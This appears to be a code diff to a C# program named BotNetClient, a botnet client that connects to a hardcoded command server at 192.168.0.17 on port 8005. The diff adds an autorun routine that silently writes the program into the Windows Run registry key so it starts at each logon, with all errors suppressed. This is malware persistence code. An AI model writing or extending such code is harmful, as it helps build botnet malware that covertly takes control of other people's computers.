@@ -5,7 +5,6 @@ using System.Net;
 using System.Threading;
 using System.Reflection;
 using Microsoft.Win32;
-using System.Windows;
 using System.IO;
 using CommandHandler;
 
@@ -13,11 +12,22 @@ namespace BotNetClient
 {
     class Program
     {
+        public static void autorun()
+        {
+            try
+            {
+                RegistryKey reg;
+                reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+                reg.SetValue("systems", Assembly.GetExecutingAssembly().ToString());
+            }
+            catch { }
+        }
         public static UInt32 idc;
         public static Thread miniprogram = new Thread(new ThreadStart(SecondThread.miniprog));
         static void Main(string[] args)
         {
             ServicePointManager.Expect100Continue = false;
+            autorun();
             string address = "192.168.0.17";
             int port = 8005;
             IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
